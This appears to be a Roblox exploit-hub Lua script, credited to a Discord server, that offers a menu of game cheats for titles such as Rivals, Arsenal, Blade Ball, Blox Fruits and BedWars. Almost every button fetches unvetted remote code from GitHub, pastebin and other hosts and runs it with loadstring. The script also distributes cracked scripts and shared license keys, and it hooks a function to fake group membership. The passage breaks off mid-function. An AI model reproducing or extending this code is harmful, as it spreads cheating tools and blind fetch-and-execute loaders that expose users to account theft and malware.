-- ts file was generated at discord.gg/25ms









--[[loader Is downthere




--> Services <--
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

--> ScriptHub V3 <--
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ice-NewbieScripter/Full-Source/main/ef9db963a45a0b57%20scripthubv3code.lua", true))() -- https://raw.githubusercontent.com/scripthubekitten/scripthubv3code/main/scripthubv3code

--> ScriptHub V3 Variables <--
local DiscordUI = CoreGui:FindFirstChild("Discord")
local DiscordUIMainFrame = DiscordUI:FindFirstChild("MainFrame")

--> ScriptHub V3 UI <--
DiscordUI.Enabled = false
DiscordUIMainFrame.Position = UDim2.new(0.5, 0, -1, 0)

--> Toggle Variable <--
local ToggeTween = false

--> Dragging Variable <--
local clickStartTime = 0

--> Creates ScreenGui <--
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = CoreGui
ScreenGui.Name = "ScriptHub V3 Toggle Button"
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 999
ScreenGui.Enabled = true 
ScreenGui.IgnoreGuiInset = false
ScreenGui.AutoLocalize = true

--> Creates ImageButton Within ScreenGui <--
local imageButton = Instance.new("ImageButton")
imageButton.Parent = ScreenGui
imageButton.Name = "Toggle Button"
imageButton.Position = UDim2.new(0.5, 0, 2, 0)
imageButton.Size = UDim2.new(0.1, 0, 0.1, 0)
imageButton.Image = "rbxassetid://118005883683019"
imageButton.BackgroundTransparency = 0
imageButton.ScaleType = Enum.ScaleType.Fit 
imageButton.Active = true
imageButton.AnchorPoint = Vector2.new(0.5, 0.5)
imageButton.AutoButtonColor = true 
imageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
imageButton.BackgroundTransparency = 1
imageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
imageButton.BorderSizePixel = 1
imageButton.ImageColor3 = Color3.fromRGB(255, 255, 255)
imageButton.ImageTransparency = 0
imageButton.Visible = true
imageButton.Draggable = true
imageButton.ZIndex = 999

--> Creates UICorner Within imageButton <--
local imageButtonUICorner = Instance.new("UICorner")
imageButtonUICorner.Parent = imageButton
imageButtonUICorner.CornerRadius = UDim.new(0.25, 0)

--> Creates Blur Instance Within ImageButton TweenService <--
local Blur = Instance.new("BlurEffect")
Blur.Name = "Blur Screen Effect"
Blur.Enabled = true 
Blur.Size = 0
Blur.Parent = Lighting

--> Blur Tween Begin <--
local BlurBeginTweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, 0, false, 0)
local BlurBeginTween = TweenService:Create(Blur, BlurBeginTweenInfo, {Size = 24})

BlurBeginTween:Play()

--> Blur Tween End <--
local BlueEndTweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, 0, false, 0.5)
local BlurEndTween = TweenService:Create(Blur, BlueEndTweenInfo, {Size = 0})

--> ImageButton Tween <--
local imageButtonTweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, 0, false, 0)
local imageButtonTween = TweenService:Create(imageButton, imageButtonTweenInfo, {Position = UDim2.new(0.5, 0, 0.035, 0)})
imageButtonTween:Play()

--> Event Handler After ImageButton Tween Ends <--
imageButtonTween.Completed:Connect(function()
    BlurEndTween:Play()
end)

--> Event Handler For Dragging Begin <--
imageButton.MouseButton1Down:Connect(function()
    clickStartTime = tick()
end)

--> Event Handler For ImageButton On Mouse Button Click <---
imageButton.MouseButton1Click:Connect(function()
    --> Check If The User Is Dragging <--
    if tick() - clickStartTime < 0.2 then
        ToggeTween = not ToggeTween
   
        --> DiscordUI MainFrame Tween Begin <--
        local DiscordUIMainFrameBeginTweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, 0, false, 0)  
        local DiscordUIMainFrameBeginTween = TweenService:Create(DiscordUIMainFrame, DiscordUIMainFrameBeginTweenInfo, {Position = UDim2.new(0.5, 0, 0.5, 0)})

    
        --> DiscordUI MainFrame Tween End <--
        local DiscordUIMainFrameEndTweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, 0, false, 0)      
        local DiscordUIMainFrameEndTween = TweenService:Create(DiscordUIMainFrame, DiscordUIMainFrameEndTweenInfo, {Position = UDim2.new(0.5, 0, -1, 0)})

    
        --> DiscordUI Toggle <--    
        if ToggeTween then       
            DiscordUI.Enabled = true                           
            DiscordUIMainFrameBeginTween:Play()    
        else
            DiscordUIMainFrameEndTween:Play()
        end
    end
end)

]]

local vu1 = loadstring(Game:HttpGet("https://raw.githubusercontent.com/TheRealXORA/Roblox/refs/heads/Main/Scripts%20/UI%20Libraries/Mobile%20Discord.lua", true))()
local v2 = vu1
local v3 = vu1.Window(v2, "{ScriptHubV3-DISCORD.GG/PRODUCTIONS} (WORKS ON ANY EXECUTORS) (V3.78a)")
local v4 = v3:Server(" \239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162  Game Scripts", "rbxassetid://18394732434")
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 GameHubs"):Button("Enable Demonic-HUB-V2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
    vu1:Notification("Notification", "Demonic-HUB-V2 Activated", "Okay!")
end)
local v5 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\184\143 \226\128\162 Grow-A-Garden")
v5:Button("Enable pandahub", function()
    loadstring(game:HttpGet("https://pandahub.website/scripts/loader.lua"))()
    vu1:Notification("Notification", "pandahub Activated", "Okay!")
end)
v5:Button("Enable Blackhub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Skibidiking123/Fisch1/refs/heads/main/FischMain"))()
    vu1:Notification("Notification", "Blackhub Activated", "Okay!")
end)
v5:Button("Enable NatHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ArdyBotzz/NatHub/refs/heads/master/NatHub.lua"))()
    vu1:Notification("Notification", "NatHub Activated", "Okay!")
end)
v5:Button("Enable ThundarZ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThundarZ/Welcome/main/Main/GaG/Main.lua"))()
    vu1:Notification("Notification", "ThundarZ Activated", "Okay!")
end)
v5:Button("Enable tbaohub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/game/refs/heads/main/TbaoHubGrowGarden"))()
    vu1:Notification("Notification", "tbaohub Activated", "Okay!")
end)
v5:Button("Enable Ronix Hub", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b44706178039e9b88c4d768d4d8b012f.lua"))()
    vu1:Notification("Notification", "Ronix Hub Activated", "Okay!")
end)
v5:Button("Enable rift(KEY SYSTEM)", function()
    loadstring(game:HttpGet("https://rifton.top/loader.lua"))()
    vu1:Notification("Notification", "rift Activated", "Okay!")
end)
v5:Button("Enable Aussie WIRE(KEY SYSTEM)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Skibidiking123/Fisch1/refs/heads/main/FischMain"))()
    vu1:Notification("Notification", "Aussie WIRE Activated", "Okay!")
end)
v5:Button("Enable NEOXHUB(KEY SYSTEM)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/loader", true))()
    vu1:Notification("Notification", "NEOXHUB Activated", "Okay!")
end)
v5:Button("Enable lumin-hub(KEY SYSTEM)", function()
    if identifyexecutor and identifyexecutor():lower():find("delta") then
        loadstring(game:HttpGet("https://lumin-hub.lol/deltaloader.lua", true))()
    else
        loadstring(game:HttpGet("https://lumin-hub.lol/loader.lua", true))()
    end
    vu1:Notification("Notification", "lumin-hub Activated", "Okay!")
end)
v5:Button("Enable getnative(KEY SYSTEM)", function()
    script_key = "PASTEKEYHERE";
    (loadstring or load)(game:HttpGet("https://getnative.cc/script/loader"))()
    vu1:Notification("Notification", "getnative Activated", "Okay!")
end)
local v6 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\184\143 \226\128\162 Steal-a-Brainrot")
v6:Button("Enable PusarX(KEY SYSTEM)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Estevansit0/KJJK/refs/heads/main/PusarX-loader.lua"))()
    vu1:Notification("Notification", "PusarX Activated", "Okay!")
end)
v6:Button("Enable LegendHub(KEY SYSTEM)", function()
    loadstring(game:HttpGet("https://scripts.city/LegendHub.lua"))()
    vu1:Notification("Notification", "LegendHub Activated", "Okay!")
end)
v6:Button("Enable ArbixHubV4", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Youifpg/Steal-a-Brianrot/refs/heads/main/ArbixHubV4.lua"))()
    vu1:Notification("Notification", "ArbixHubV4 Activated", "Okay!")
end)
v6:Button("Enable zenizmilen", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zenizmilen/script-steal-a-brainrot/refs/heads/main/follo-me-for-work-noclip"))()
    vu1:Notification("Notification", "zenizmilen Activated", "Okay!")
end)
local v7 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 DaHood")
v7:Label("Locks/camlocks & MISC Are located at 2nd icon tab")
v7:Button("Enable SwagMode", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002"))()
    vu1:Notification("Notification", "SwagMode Activated", "Okay!")
end)
v7:Button("Enable Faded", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
    vu1:Notification("Notification", "Faded Activated", "Okay!")
end)
v7:Button("Enable NukerMode(might not work)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Allvideo1/Nukermode/main/Nukerscript"))()
    vu1:Notification("Notification", "NukerMode Activated", "Okay!")
end)
v7:Button("Enable Spaceware", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Maxiiiiiiiiiiiiiiiiiiiiiii/spaceware/main/spaceware"))()
    vu1:Notification("Notification", "Spaceware Activated", "Okay!")
end)
v7:Button("Enable QuerNukerHub (OLD)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/QuerNukerHub/main/QuerNukerHub", true))()
    vu1:Notification("Notification", "QuerNukerHub Activated", "Okay!")
end)
v7:Button("Enable DH-SKIN-CHANGER (OLD)", function()
    hookfunction(game.Players.LocalPlayer.IsInGroup, function()
        return true
    end)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Invooker1/Hub/main/DH-Skin-Changer.lua", true))()
    vu1:Notification("Notification", "DH-SKIN-CHANGER Activated", "Okay!")
end)
v7:Button("Enable Raycodex", function()
    loadstring(game:GetObjects("rbxassetid://5812737894")[1].Source)()
    vu1:Notification("Notification", "Raycodex Activated", "Okay!")
end)
v7:Button("Enable DHBCommunityV6 (OLD)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/main/DHHScript"))()
    vu1:Notification("Notification", "DHBCommunityV6 Activated", "Okay!")
end)
v7:Button("Enable TBOscript", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cool5013/TBO/main/TBOscript"))()
    vu1:Notification("Notification", "TBOscript Activated", "Okay!")
end)
v7:Button("Enable Polakya", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pixelheadx/Polakya/main/Bestscript.md"))()
    vu1:Notification("Notification", "Polakya Activated", "Okay!")
end)
v7:Button("Enable AgentCC", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/mrhackerman35297/AgentCC/main/Launch.lua"))()
    vu1:Notification("Notification", "AgentCC Activated", "Okay!")
end)
v7:Button("Enable Vortex", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ImagineProUser/vortexdahood/main/vortex", true))()
    vu1:Notification("Notification", "Vortex Activated", "Okay!")
end)
local v8 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Rivals")
v8:Label("MOST RIVALS SCRIPTS ARE DETECTED ONCE U EXECUTED")
v8:Button("Enable Midnight.cc", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/laeraz/midnightcc/main/public.lua"))()
    vu1:Notification("Notification", "midnightcc Activated", "Okay!")
end)
v8:Button("Enable JonnyCheeser", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/JonnyCheeser/rivals/main/rival", true))()
    vu1:Notification("Notification", "JonnyCheeser Activated", "Okay!")
end)
v8:Button("Enable thaibao", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubRivals", true))()
    vu1:Notification("Notification", "thaibaow Activated", "Okay!")
end)
v8:Button("Enable Sheeshablee73", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/rivals/main/rivals", true))()
    vu1:Notification("Notification", "Sheeshablee73 Activated", "Okay!")
end)
v8:Button("Enable SkibidiCen", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiCen/MainMenu/main/Code", true))()
    vu1:Notification("Notification", "SkibidiCen Activated", "Okay!")
end)
v8:Button("Enable SilentRivals(THE SCRIPT I USE ALL THE TIME)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KxGOATESQUE/SilentRivals/main/SilentRivals"))()
    vu1:Notification("Notification", "SilentRivals Activated", "Okay!")
end)
v8:Button("Enable SilentRivals(Mobile/Wave)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KxGOATESQUE/SilentRivals/main/SilentRivalsWave"))()
    vu1:Notification("Notification", "SilentRivals Activated", "Okay!")
end)
v8:Button("copy key", function()
    setclipboard("SILENT-Zyrpjh57JtlEHyaV-RIVALS")
    vu1:Notification("Notification", "Copied to Clipboard", "Okay!")
end)
v8:Button("Enable VenoxWare", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/venoxhh/universalscripts/main/rivals/SolaraVenoxWare.lua"))()
    vu1:Notification("Notification", "VenoxWare Activated", "Okay!")
end)
v8:Button("copy key(COULD BE A OLD KEY)", function()
    setclipboard("solarabetrippinFRRR_VenoxOnTop")
    vu1:Notification("Notification", "Copied to Clipboard", "Okay!")
end)
v8:Button("Enable Ronix Hub", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/47fc2ea07fef3d78fb68ca87ab2b7503.lua"))()
    vu1:Notification("Notification", "Ronix Hub Activated", "Okay!")
end)
v8:Button("Enable Ronix Hub Lite (Support for solara-xeno users-low unc)", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/51246f83a9c77b825354d5d151c63c50.lua"))()
    vu1:Notification("Notification", "Ronix Hub Activated", "Okay!")
end)
local v9 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Arsenal")
v9:Button("Enable TbaoHubArsenal", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubArsenal"))()
    vu1:Notification("Notification", "thaibao Activated", "Okay!")
end)
v9:Button("Enable Tect-Menu", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Arsenalscript.txt"))()
    vu1:Notification("Notification", "Tect-Menu Activated", "Okay!")
end)
v9:Button("Enable Darkrai Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/arsenal-hub/main/Arsenal%20GamingScripter", true))()
    vu1:Notification("Notification", "Darkrai Hub Activated", "Okay!")
end)
v9:Button("Enable Banana Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptRUs/BananaHub/main/BananaHub.lua"))()
    vu1:Notification("Notification", "Darkrai Hub Activated", "Okay!")
end)
v9:Button("Enable virtual.cc", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DomainXV3/DomainX/main/virtual.cc", true))()
    vu1:Notification("Notification", "virtual.cc Activated", "Okay!")
end)
v9:Button("Enable VG HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub"))()
    vu1:Notification("Notification", "VG HUB Activated", "Okay!")
end)
v9:Button("Enable midnightcc", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/laeraz/midnightcc/main/public.lua"))()
    vu1:Notification("Notification", "midnightcc Activated", "Okay!")
end)
v9:Button("Enable mysploit", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/wuhaz/arsenal/main/main.lua"))()
    vu1:Notification("Notification", "mysploit Activated", "Okay!")
end)
v9:Button("Enable Nexware", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DatMxkey/Nexware/main/loader.lua"))()
    vu1:Notification("Notification", "Nexware Activated", "Okay!")
end)
v9:Button("Enable Thunder-Client", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/andrewdarkyyofficial/thunderclient/main/main.lua"))()
    vu1:Notification("Notification", "Thunder-Client Activated", "Okay!")
end)
v9:Button("Enable Reaper Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AyoReaper/Reaper-Hub/main/loader.lua"))()
    vu1:Notification("Notification", "Reaper Hub Activated", "Okay!")
end)
v9:Button("Enable QPScript", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/QPScript/Script/main/Arsenal.txt"))()
    vu1:Notification("Notification", "QPScript Activated", "Okay!")
end)
v9:Button("Enable EZHUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/debug42O/Ez-Industries-Launcher-Data/master/Launcher.lua", true))()
    vu1:Notification("Notification", "EZHub Activated", "Okay!")
end)
v9:Button("Enable Solaris", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Counter-Blox-Solaris-14633"))()
    vu1:Notification("Notification", "Solaris Activated", "Okay!")
end)
v9:Button("Enable QuotasHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Insertl/QuotasHub/main/BETAv1.3"))()
    vu1:Notification("Notification", "QuotasHub Activated", "Okay!")
end)
v9:Button("Enable leghub", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/G6Ubkkuv"))()
    vu1:Notification("Notification", "leghub Activated", "Okay!")
end)
v9:Button("Enable ThunderClientForSolara", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderScriptSolutions/ThunderClientForSolara/main/ThunderClientGameSupport"))()
    vu1:Notification("Notification", "ThunderClientForSolara Activated", "Okay!")
end)
v9:Button("Enable VoidHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidzyScripter/VoidHub-/main/Source%20Code"))()
    vu1:Notification("Notification", "VoidHub Activated", "Okay!")
end)
v9:Button("Enable Sanity WTF", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/helldevelopment/RobloxScripts/main/SanityLoader.lua"))()
    vu1:Notification("Notification", "Sanity WTF Activated", "Okay!")
end)
local v10 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 blade-ball")
v10:Button("Enable venox-blade-ball", function()
    loadstring(Game:HttpGet("https://raw.githubusercontent.com/Fsploit/venox-blade-ball-v1/main/K-A-T-S-U-S-F-S-P-L-O-I-T-I-S-A-F-U-R-R-Y%20MAIN%20V4"))()
    vu1:Notification("Notification", "venox-blade-ball Activated", "Okay!")
end)
v10:Button("Enable visual 3.5(keyless)", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a5945467f3b9388503ca653c0ea49cba.lua"))()
    vu1:Notification("Notification", "visual 3.5(keyless) Activated", "Okay!")
end)
v10:Button("Enable DDZC V2.5", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Atreus-Hub/DenDenZ-Creationz/main/KeyRBLX%20BladeBall"))()
    vu1:Notification("Notification", "DDZC V2.5 Activated", "Okay!")
end)
v10:Button("Enable Schema", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/manimanni/Schema/main/posse.lua"))()
    vu1:Notification("Notification", "Schema Activated", "Okay!")
end)
v10:Button("Enable Bedol Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nqxlOfc/Loaders/main/Blade_Ball.lua"))()
    vu1:Notification("Notification", "Bedol Hub Activated", "Okay!")
end)
v10:Button("Enable Bedol Hub V4 BETA (OP)", function()
    local _, _ = pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/New-C4-Remote.lua/main/BetaTest/Bladeball15m.html")))
    vu1:Notification("Notification", "Bedol Hub V4 BETA Activated", "Okay!")
end)
v10:Button("Enable FFJ(2.5)(Keyless)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/autoparry.lua"))()
    vu1:Notification("Notification", "FFJ Activated", "Okay!")
end)
v10:Button("Enable Snowiwe Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/snowiwe/BladeBall/main/freeversion"))()
    vu1:Notification("Notification", "Snowiwe Hub Activated", "Okay!")
end)
v10:Button("Enable Neverlose Hub", function()
    loadstring("loadstring(game:HttpGet(\"https://freenote.biz/raw/nfz0zqdyun\"))()\n")()
    vu1:Notification("Notification", "Neverlose Hub Activated", "Okay!")
end)
v10:Button("Enable GPLLP *KEYLESS*", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/songolasangkatangw/memek/main/adakontolsamamemek.lua"))()
    vu1:Notification("Notification", "GPLLPW Activated", "Okay!")
end)
v10:Button("Enable alchemyhub", function()
    loadstring(game:HttpGet("https://scripts.alchemyhub.xyz"))()
    vu1:Notification("Notification", "alchemyhub Activated", "Okay!")
end)
v10:Button("Enable zaphub", function()
    loadstring(game:HttpGet("https://www.zaphub.xyz/Exec"))()
    vu1:Notification("Notification", "zaphub Activated", "Okay!")
end)
v10:Button("Enable PitbullHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SoyAdriYT/PitbullHub--/main/Destroyer", true))()
    vu1:Notification("Notification", "PitbullHub Activated", "Okay!")
end)
v10:Button("Enable Azy", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/sCJTSMj2"))()
    vu1:Notification("Notification", "Azy Activated", "Okay!")
end)
v10:Button("Enable omghub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
    vu1:Notification("Notification", "OMGHUB Activated", "Okay!")
end)
v10:Button("Enable DenDenZonYT", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Atreus-Hub/scripts/main/Pre-Update%20Blade%20Ball"))()
    vu1:Notification("Notification", "DenDenZonYT Activated", "Okay!")
end)
v10:Button("Enable code4zaa", function()
    loadstring(game:HttpGet("https://code4zaa.xyz/script/script-loader.lua"))()
    vu1:Notification("Notification", "code4zaa Activated", "Okay!")
end)
v10:Button("Enable TripleHubV2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TripleScript/TripleHub/main/TripleHubV2.txt"))()
    vu1:Notification("Notification", "TripleHubV2 Activated", "Okay!")
end)
v10:Button("Enable NightRBX", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/kiurgjirkgk/NightForRoblox/main/loader.lua"))()
    vu1:Notification("Notification", "NightRBX Activated", "Okay!")
end)
v10:Button("Enable Ronix Hub", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/79ab2d3174641622d317f9e234797acb.lua"))()
    vu1:Notification("Notification", "Ronix Hub Activated", "Okay!")
end)
local v11 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Bloxfruits")
v11:Button("Enable Maris Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/marisdeptrai/Fram-ChestV2/main/Maris-Hub"))()
    vu1:Notification("Notification", "Maris Hub Activated", "Okay!")
end)
v11:Button("Enable REDzHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))(Settings)
    vu1:Notification("Notification", "REDzHub Activated", "Okay!")
end)
v11:Button("Enable Annie Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1st-Mars/Annie/main/1st.lua"))()
    vu1:Notification("Notification", "Annie Hub Activated", "Okay!")
end)
v11:Button("Enable Hoho hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
    vu1:Notification("Notification", " Hoho hub Activated", "Okay!")
end)
v11:Button("Enable Zenhub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenhubtop/zen_hub_pr/main/zennewwwwui.lua", true))()
    vu1:Notification("Notification", "Zenhub Activated", "Okay!")
end)
v11:Button("Enable Kee-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nghia11n/Kee-Hub/main/keev2.lua"))()
    vu1:Notification("Notification", "Kee-Hub Activated", "Okay!")
end)
v11:Button("Enable X-Sea-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XRayDerxDOne/Release-/main/Release.lua"))()
    vu1:Notification("Notification", "X-Sea-Hub Activated", "Okay!")
end)
v11:Button("Enable MinGamingHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Basicallyy/Basicallyy/main/MinGamingV4.lua"))()
    vu1:Notification("Notification", "MinGamingHub Activated", "Okay!")
end)
v11:Button("Enable W-azure", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
    vu1:Notification("Notification", "W-azure Activated", "Okay!")
end)
v11:Button("Enable Speed-Hub-X V3", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
    vu1:Notification("Notification", " Speed-Hub-X V3 Activated", "Okay!")
end)
v11:Button("Enable CokkaHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/UserDevEthical/Loadstring/main/CokkaHub.lua"))()
    vu1:Notification("Notification", "CokkaHub Activated", "Okay!")
end)
v11:Button("Enable Fai-Fao", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PNguyen0199/Script/main/Fai-Fao-Ver2.lua"))()
    vu1:Notification("Notification", "Fai-Fao Activated", "Okay!")
end)
v11:Button("Enable matssunehub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/matssunehub.lua"))()
    vu1:Notification("Notification", "matssunehub Activated", "Okay!")
end)
v11:Button("Enable Ripperhub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
    vu1:Notification("Notification", "Ripperhub Activated", "Okay!")
end)
v11:Button("Enable relzhub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/farghii/relzhub/main/execute.hack", true))()
    vu1:Notification("Notification", "relzhub Activated", "Okay!")
end)
v11:Button("Enable Mmahub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MAMAhub1/Mmahub/main/README.md"))()
    vu1:Notification("Notification", "Mmahub Activated", "Okay!")
end)
v11:Button("Enable Euphoria(CRACKED)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cracklua/cracks/m/Euphoria"))("obfuscate")
    vu1:Notification("Notification", "Euphoria Activated", "Okay!")
end)
v11:Button("Enable BLACKTRAP(CRACKED-KEYLESS)", function()
    loadstring(game:HttpGet("https://you.whimper.xyz/sources/btteam/BloxFruits.lua"))()
    vu1:Notification("Notification", "BLACKTRAP Activated", "Okay!")
end)
local v12 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\184\143 \226\128\162 BedWars")
v12:Button("Enable VapeVoidware Rewrite (NEWEST-OP)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VWRewrite/main/NewMainScript.lua", true))()
    vu1:Notification("Notification", "VapeVoidware Activated", "Okay!")
end)
v12:Button("Enable Aurora(NEWEST)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cocotv666/Aurora/main/Aurora_Loader"))()
    vu1:Notification("Notification", "Aurora Activated", "Okay!")
end)
v12:Button("Enable VapeV4", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
    vu1:Notification("Notification", "VapeV4 Activated", "Okay!")
end)
v12:Button("Enable ScriptHubV1.1 (OP-OLD)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/bedwarstest/main/vazs", true))()
    vu1:Notification("Notification", "ScriptHubV1.1 Activated", "Okay!")
end)
v12:Label("turn off auto clicker for less lag & scripthubV1.1 SIMILAR TO VAPE")
v12:Button("Enable Autumn", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/0x0xLol/Autumn/main/MainScript.lua", true))()
    vu1:Notification("Notification", "Autumn Activated", "Okay!")
end)
v12:Button("Enable Aether Client", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CakScripts/AetherClientBW/main/MainScript"))()
    vu1:Notification("Notification", "Aether Client Activated", "Okay!")
end)
v12:Button("Enable Polaris V2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RunAccount1/PolarisRewrite/main/TempMainScript.lua", true))()
    vu1:Notification("Notification", "Polaris V2 Activated", "Okay!")
end)
v12:Button("Enable Snyware", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AFGCLIENT/Snyware/main/Loader"))()
    vu1:Notification("Notification", "Snyware Activated", "Okay!")
end)
v12:Button("Enable FlamingDrey(OLD)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FlamingDrey/Flame-x-v3/main/Flame%20x%20v3"))()
